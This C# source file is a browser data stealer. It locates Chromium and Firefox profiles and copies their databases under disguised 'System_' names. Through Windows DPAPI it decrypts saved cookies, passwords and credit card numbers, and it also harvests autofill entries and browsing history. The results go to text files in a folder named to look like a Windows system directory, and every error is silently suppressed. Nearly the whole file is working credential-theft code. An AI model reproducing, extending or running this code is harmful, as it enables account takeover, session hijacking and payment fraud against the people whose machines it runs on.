using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using sql;

namespace brtest
{
    class browserstest
    {
        private static List<string> getbrowsers()
        {
            try
            {
                List<string> browsers = new List<string>();
                string[] dirs1 = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
                string[] dirs2 = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
                for (int i = 0; i < dirs1.Length; i++)
                {
                    string[] files1 = Directory.GetFiles(dirs1[i]);
                    foreach (string fs in files1)
                    {
                        if (Path.GetFileName(fs) == "Cookies")
                        {
                            browsers.Add(dirs1[i]);
                        }
                    }

                    string[] folders = Directory.GetDirectories(dirs1[i]);
                    foreach (string ff in folders)
                    {
                        string[] files2 = Directory.GetFiles(ff);
                        foreach (string fs2 in files2)
                        {
                            if (Path.GetFileName(fs2) == "Cookies")
                            {
                                browsers.Add(ff);
                            }
                        }
                        string[] foldersv2 = Directory.GetDirectories(ff);
                        foreach (string ff2 in foldersv2)
                        {
                            string[] files3 = Directory.GetFiles(ff2);
                            foreach (string fs22 in files3)
                            {
                                if (Path.GetFileName(fs22) == "Cookies")
                                {
                                    browsers.Add(ff2);
                                }
                            }
                            try
                            {
                                string[] folders3 = Directory.GetDirectories(ff2);
                                foreach (string ff3 in folders3)
                                {
                                    string[] files4 = Directory.GetFiles(ff3);
                                    foreach (string fs4 in files4)
                                    {
                                        if (Path.GetFileName(fs4) == "Cookies")
                                        {
                                            browsers.Add(ff3);
                                        }
                                    }
                                }
                            }
                            catch
                            {

                            }

                        }
                    }
                }


                for (int i = 0; i < dirs2.Length; i++)
                {
                    try
                    {
                        string[] files1 = Directory.GetFiles(dirs2[i]);
                        foreach (string fs in files1)
                        {
                            if (Path.GetFileName(fs) == "Cookies")
                            {
                                browsers.Add(dirs2[i]);
                            }
                        }
                        string[] folders = Directory.GetDirectories(dirs2[i]);
                        foreach (string ff in folders)
                        {
                            string[] files2 = Directory.GetFiles(ff);
                            foreach (string fs2 in files2)
                            {
                                if (Path.GetFileName(fs2) == "Cookies")
                                {
                                    browsers.Add(ff);
                                }
                            }
                            string[] foldersv2 = Directory.GetDirectories(ff);
                            foreach (string ff2 in foldersv2)
                            {
                                string[] files3 = Directory.GetFiles(ff2);
                                foreach (string fs22 in files3)
                                {
                                    if (Path.GetFileName(fs22) == "Cookies")
                                    {
                                        browsers.Add(ff2);
                                    }
                                }
                                try
                                {
                                    string[] folders3 = Directory.GetDirectories(ff2);
                                    foreach (string ff3 in folders3)
                                    {
                                        string[] files4 = Directory.GetFiles(ff3);
                                        foreach (string fs4 in files4)
                                        {
                                            if (Path.GetFileName(fs4) == "Cookies")
                                            {
                                                browsers.Add(ff3);
                                            }
                                        }
                                    }
                                }
                                catch
                                {

                                }

                            }
                        }
                    }
                    catch
                    {
                    }
                }




                return browsers;
            }
            catch(Exception ex)
            {
                return null;
            }
        }
        public static void Cookies()
        {
            try
            {
                string defpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Browsers/Chromium";
                Directory.CreateDirectory(defpath);
                List<string> browsers = getbrowsers();
                Random rnd = new Random();
                foreach (string browser in browsers)
                {
                    using (StreamWriter sw = new StreamWriter(defpath + @"\Cookies.txt", true, Encoding.Default))
                    {
                        sw.WriteLine(string.Format("Browser - {0}\n\n", browser));
                        string cookiePath = browser + @"\Cookies";
                        if (File.Exists(cookiePath))
                        {
                                                    long lenght = new FileInfo(cookiePath).Length;
                        if (lenght < 10000 || lenght == 28672 || lenght == 20480) 
                        {
                            continue;
                        }
                        string rndpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\System_" + rnd.Next(10000000);
                        File.Copy(cookiePath, rndpath, true);
                        if (browser.Contains("Guest Profile") || browser.Contains("System Profile"))
                        {
                            File.Delete(rndpath);
                            continue;
                        }
                        SqlHandler SqlHandler = new SqlHandler(rndpath);
                        SqlHandler.ReadTable("cookies");

                        for (int i = 0; i < SqlHandler.GetRowCount(); i++)
                        {
                            string value = "";

                            try
                            {
                                value = Encoding.UTF8.GetString(DecryptBrowsers(Encoding.Default.GetBytes(SqlHandler.GetValue(i, 12)), null));
                                string host_key = SqlHandler.GetValue(i, 1);
                                string name = SqlHandler.GetValue(i, 2);
                                string path = SqlHandler.GetValue(i, 4);
                                string expires_utc = SqlHandler.GetValue(i, 5);
                                string is_secure = SqlHandler.GetValue(i, 6).ToUpper();
                                if (value == "") value = SqlHandler.GetValue(i, 3);
                                //return string.Format("{0}\tFALSE\t/\t{1}\t{2}\t{3}\t{4}\t{5}\r\n", host_key,name,value,path,expires_utc,is_secure);
                                sw.Write(string.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", host_key, path, expires_utc, name, value));
                            }
                            catch(Exception ex)
                            {
                            }

                        }
                        sw.WriteLine(string.Format("\n\n"));
                        File.Delete(rndpath);
                    }
                        }





                }
            }
            catch(Exception ex)
            {
                
            }

        }
        public static void Passwords()
        {
            try
            {
                string defpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Browsers/Chromium";
                Directory.CreateDirectory(defpath);
                List<string> browsers = getbrowsers();
                Random rnd = new Random();
                foreach (string browser in browsers)
                {
                    try
                    {
                        using (StreamWriter sw = new StreamWriter(defpath + @"\Passwords.txt", true, Encoding.Default))
                        {
                            sw.WriteLine(string.Format("Browser - {0}\n\n", browser));
                            string browserpath = browser + @"\Login Data";
                            string rndpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\System_" + rnd.Next(10000000);
                            File.Copy(browserpath, rndpath, true);
                            if (browser.Contains("Guest Profile") || browser.Contains("System Profile"))
                            {
                                File.Delete(rndpath);
                                continue;
                            }
                            SqlHandler SqlHandler = new SqlHandler(rndpath);
                            SqlHandler.ReadTable("logins");
                            if(SqlHandler.GetRowCount() != 65536)
                            {
                                for (int i = 0; i < SqlHandler.GetRowCount(); i++)
                                {
                                    string value = "";

                                    try
                                    {
                                        value = Encoding.UTF8.GetString(DecryptBrowsers(Encoding.Default.GetBytes(SqlHandler.GetValue(i, 5)), null));
                                        string action_url = SqlHandler.GetValue(i, 1);
                                        string username_value = SqlHandler.GetValue(i, 3);
                                        sw.Write(string.Format("Action URL : {0}\t\nUsername : {1}\t\nValue : {2}\t\n\n", action_url, username_value, value));
                                        //return string.Format("{0}\tFALSE\t/\t{1}\t{2}\t{3}\t{4}\t{5}\r\n", host_key,name,value,path,expires_utc,is_secure);
                                    }
                                    catch
                                    {
                                    }

                                }
                                sw.WriteLine(string.Format("\n\n"));
                                File.Delete(rndpath);
                            }


                        }
                    }
                    catch
                    {
                        continue;
                    }

                }
            }
            catch (Exception ex)
            {

            }

        }


        public static void autofill()
        {
            try
            {
                string defpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Browsers/Chromium";
                Directory.CreateDirectory(defpath);
                List<string> browsers = getbrowsers();
                Random rnd = new Random();
                foreach (string browser in browsers)
                {
                    try
                    {
                        using (StreamWriter sw = new StreamWriter(defpath + @"\Autofill.txt", true, Encoding.Default))
                        {
                            sw.WriteLine(string.Format("Browser - {0}\n\n", browser));
                            string browserpath = browser + @"\Web Data";
                            long lenght = new FileInfo(browserpath).Length;
                            string rndpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\System_" + rnd.Next(10000000);
                            File.Copy(browserpath, rndpath, true);
                            if (browser.Contains("Guest Profile") || browser.Contains("System Profile"))
                            {
                                File.Delete(rndpath);
                                continue;
                            }
                            SqlHandler SqlHandler = new SqlHandler(rndpath);
                            SqlHandler.ReadTable("autofill");
                            if (SqlHandler.GetRowCount() != 65536)
                            {
                                                                for (int i = 0; i < SqlHandler.GetRowCount(); i++)
                            {
                                string value = "";

                                try
                                {
                                    string name = SqlHandler.GetValue(i, 0);
                                    value = SqlHandler.GetValue(i, 1);
                                    sw.Write(string.Format("Name : {0}\t\nValue : {1}\t\n\n", name, value));
                                    //return string.Format("{0}\tFALSE\t/\t{1}\t{2}\t{3}\t{4}\t{5}\r\n", host_key,name,value,path,expires_utc,is_secure);
                                }
                                catch
                                {
                                }

                            }
                            sw.WriteLine(string.Format("\n\n"));
                            File.Delete(rndpath);
                            }
                        }
                    }
                    catch
                    {
                        continue;
                    }

                }
            }
            catch (Exception ex)
            {

            }

        }
        public static void cc()
        {
            try
            {
                string defpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Browsers/Chromium";
                Directory.CreateDirectory(defpath);
                List<string> browsers = getbrowsers();
                Random rnd = new Random();
                foreach (string browser in browsers)
                {
                    try
                    {
                        using (StreamWriter sw = new StreamWriter(defpath + @"/CC.txt", true, Encoding.Default))
                        {
                            sw.WriteLine(string.Format("Browser - {0}\n\n", browser));
                            string browserpath = browser + @"\Web Data";
                            if (File.Exists(browserpath))
                            {
                                string rndpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\System_" + rnd.Next(100000000);
                                File.Copy(browserpath, rndpath, true);
                                if (browser.Contains("Guest Profile") | browser.Contains("System Profile"))
                                {
                                    File.Delete(rndpath);
                                    continue;
                                }
                                SqlHandler SqlHandler = new SqlHandler(rndpath);
                                try
                                {
                                    SqlHandler.ReadTable("credit_cards");

                                    if (SqlHandler.GetRowCount() != 65536)
                                    {
                                        for (int i = 0; i < SqlHandler.GetRowCount(); ++i)
                                        {
                                            string card_number = "";

                                            try
                                            {
                                                card_number = Encoding.UTF8.GetString(DecryptBrowsers(Encoding.Default.GetBytes(SqlHandler.GetValue(i, 4)), null));
                                                string exp_year = SqlHandler.GetValue(i, 3);
                                                string exp_month = SqlHandler.GetValue(i, 2);
                                                string name = SqlHandler.GetValue(i, 1);
                                                sw.Write(string.Format("{0}\t{1}/{2}\t {3}", card_number, exp_month, exp_year, name));
                                                //return string.Format("{0}\tFALSE\t/\t{1}\t{2}\t{3}\t{4}\t{5}\r\n", host_key,name,value,path,expires_utc,is_secure);
                                            }
                                            catch
                                            {
                                            }

                                        }
                                        sw.WriteLine(string.Format("\n\n"));
                                        File.Delete(rndpath);
                                    }
                                }
                                catch
                                {

                                }

                            }


                        }
                    }
                    catch
                    {
                        continue;
                    }

                }
            }
            catch (Exception ex)
            {
            }

        }
        public static void History()
        {
            try
            {
                string defpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Browsers/Chromium";
                Directory.CreateDirectory(defpath);
                List<string> browsers = getbrowsers();
                Random rnd = new Random();
                foreach (string browser in browsers)
                {
                    try
                    {
                        using (StreamWriter sw = new StreamWriter(defpath + @"\History.txt", true, Encoding.Default))
                        {
                            sw.WriteLine(string.Format("Browser - {0}\n\n", browser));
                            string browserpath = browser + @"\History";
                            long lenght = new FileInfo(browserpath).Length;
                            string rndpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\System_" + rnd.Next(10000000);
                            File.Copy(browserpath, rndpath, true);
                            if (browser.Contains("Guest Profile") || browser.Contains("System Profile"))
                            {
                                File.Delete(rndpath);
                                continue;
                            }
                            SqlHandler SqlHandler = new SqlHandler(rndpath);
                            SqlHandler.ReadTable("urls");
                            if(SqlHandler.GetRowCount() != 65536)
                            {
                                for (int i = 0; i < SqlHandler.GetRowCount(); i++)
                                {
                                    try
                                    {
                                        string url = SqlHandler.GetValue(i, 1);
                                        string tittle = Encoding.UTF8.GetString(Encoding.Default.GetBytes(SqlHandler.GetValue(i, 2)));
                                        int visit_times = Convert.ToInt16(SqlHandler.GetValue(i, 3)) + 1;
                                        sw.Write(string.Format("Site: {0}\t\nTittle: {1}\t\nVisit count: {2}\t\n\n\n", url, tittle, visit_times));
                                        //return string.Format("{0}\tFALSE\t/\t{1}\t{2}\t{3}\t{4}\t{5}\r\n", host_key,name,value,path,expires_utc,is_secure);
                                    }
                                    catch
                                    {
                                    }

                                }
                                sw.WriteLine(string.Format("\n\n"));
                                File.Delete(rndpath);
                            }

                        }
                    }
                    catch
                    {
                        continue;
                    }

                }
            }
            catch (Exception ex)
            {

            }

        }
        private static string mozilla_getpath()
        {
            try
            {
                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\Profiles"))
                {
                    Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Browsers\Mozilla");
                    string[] dirs = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\Profiles");
                    foreach (string dir in dirs)
                    {
                        string[] fil = Directory.GetFiles(dir);
                        foreach (string fl in fil)
                        {
                            if (Path.GetFileName(fl) == "logins.json")
                            {
                                return dir;
                            }
                            else
                            {
                            }
                        }
                    }
                    return null;
                }
                else
                {
                    return null;
                }
            }
            catch
            {
                return null;
            }

        }


        public static void mozilla()
        {
            try
            {
                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\Profiles"))
                {
                    Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Browsers\Mozilla");
                }
                using (StreamWriter sw = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Browsers\Mozilla\Cookies.txt", true, Encoding.Default))
                {
                    string dir = mozilla_getpath();
                    SqlHandler sql = new SqlHandler(dir + @"/cookies.sqlite");
                    sql.ReadTable("moz_cookies");
                    for (int i = 0; i < sql.GetRowCount(); i++)
                    {
                        string host = sql.GetValue(i, 5);
                        string name = sql.GetValue(i, 3);
                        string value = sql.GetValue(i, 4);
                        string path = sql.GetValue(i, 6);
                        string expires = sql.GetValue(i, 7);
                        sw.Write(string.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", host, path, expires, name, value));
                    }

                }
            }
            catch
            {

            }

        }
        public static void NewCookies()
        {

            try
            {
                string defpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Browsers/Chromium";
                Directory.CreateDirectory(defpath);
                List<string> browsers = getbrowsers();
                Random rnd = new Random();
                foreach (string browser in browsers)
                {
                    using (StreamWriter sw = new StreamWriter(defpath + @"\Cookies.txt", true, Encoding.Default))
                    {
                        sw.WriteLine(string.Format("Browser - {0}\n\n", browser));
                        string cookiePath = browser + @"\Cookies";
                        if (File.Exists(cookiePath))
                        {
                            string rndpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\System_" + rnd.Next(10000000);
                            File.Copy(cookiePath, rndpath, true);
                            if (browser.Contains("Guest Profile") || browser.Contains("System Profile"))
                            {
                                File.Delete(rndpath);
                                continue;
                            }
                            SqlHandler SqlHandler = new SqlHandler(rndpath);
                            SqlHandler.ReadTable("cookies");

                            for (int i = 0; i < SqlHandler.GetRowCount(); i++)
                            {
                                string value = "";

                                try
                                {
                                    value = Encoding.UTF8.GetString(DecryptBrowsers(Encoding.Default.GetBytes(SqlHandler.GetValue(i, 12)), null));
                                    string host_key = SqlHandler.GetValue(i, 1);
                                    string name = SqlHandler.GetValue(i, 2);
                                    string path = SqlHandler.GetValue(i, 4);
                                    string expires_utc = SqlHandler.GetValue(i, 5);
                                    string is_secure = SqlHandler.GetValue(i, 6).ToUpper();
                                    if (value == "") value = SqlHandler.GetValue(i, 3);
                                    //return string.Format("{0}\tFALSE\t/\t{1}\t{2}\t{3}\t{4}\t{5}\r\n", host_key,name,value,path,expires_utc,is_secure);
                                    sw.Write(string.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", host_key, path, expires_utc, name, value));
                                }
                                catch (Exception ex)
                                {
                                }

                            }
                            sw.WriteLine(string.Format("\n\n"));
                            File.Delete(rndpath);
                        }
                    }





                }
            }
            catch (Exception ex)
            {

            }


        }



















































        [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool CryptUnprotectData(ref DataBlob pCipherText, ref string pszDescription, ref DataBlob pEntropy, IntPtr pReserved, ref CryptprotectPromptstruct pPrompt, int dwFlags, ref DataBlob pPlainText);

        public static byte[] DecryptBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
        {
            DataBlob pPlainText = new DataBlob();
            DataBlob pCipherText = new DataBlob();
            DataBlob pEntropy = new DataBlob();
            CryptprotectPromptstruct pPrompt = new CryptprotectPromptstruct()
            {
                cbSize = Marshal.SizeOf(typeof(CryptprotectPromptstruct)),
                dwPromptFlags = 0,
                hwndApp = IntPtr.Zero,
                szPrompt = (string)null
            };
            string empty = string.Empty;
            try
            {
                try
                {
                    if (cipherTextBytes == null)
                        cipherTextBytes = new byte[0];
                    pCipherText.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
                    pCipherText.cbData = cipherTextBytes.Length;
                    Marshal.Copy(cipherTextBytes, 0, pCipherText.pbData, cipherTextBytes.Length);
                }
                catch
                {
                }
                try
                {
                    if (entropyBytes == null)
                        entropyBytes = new byte[0];
                    pEntropy.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
                    pEntropy.cbData = entropyBytes.Length;
                    Marshal.Copy(entropyBytes, 0, pEntropy.pbData, entropyBytes.Length);
                }
                catch
                {
                }
                CryptUnprotectData(ref pCipherText, ref empty, ref pEntropy, IntPtr.Zero, ref pPrompt, 1, ref pPlainText);
                byte[] destination = new byte[pPlainText.cbData];
                Marshal.Copy(pPlainText.pbData, destination, 0, pPlainText.cbData);
                return destination;
            }
            catch
            {
            }
            finally
            {
                if (pPlainText.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pPlainText.pbData);
                if (pCipherText.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pCipherText.pbData);
                if (pEntropy.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pEntropy.pbData);
            }
            return new byte[0];
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CryptprotectPromptstruct
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DataBlob
        {
            public int cbData;
            public IntPtr pbData;
        }
    }
}
